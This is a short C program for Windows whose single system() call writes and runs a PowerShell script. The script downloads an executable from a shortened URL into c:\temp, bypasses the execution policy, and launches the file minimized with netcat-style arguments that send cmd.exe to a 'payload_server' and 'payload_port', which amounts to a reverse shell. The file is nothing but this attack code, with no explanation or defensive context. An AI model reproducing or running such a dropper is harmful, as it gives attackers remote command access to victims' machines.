#include<windows.h>
#include<string.h>
#include<stdio.h>

int main() {

      system("cmd.exe /c mkdir c:\\temp 2> NUL & echo ^[Net.ServicePointManager^]::SecurityProtocol ^= ^[Net.SecurityProtocolType^]::Tls12 > c:\\temp\\b.ps1 & echo (wget 'https://tinyurl.com/y88r9epk' -OutFile c:\\temp\\a.exe) >> c:\\temp\\b.ps1 & cmd.exe /c powershell -ExecutionPolicy ByPass -File c:\\temp\\b.ps1 & START /MIN c:\\temp\\a.exe payload_server payload_port -e cmd.exe -d & exit");
      return 0;
}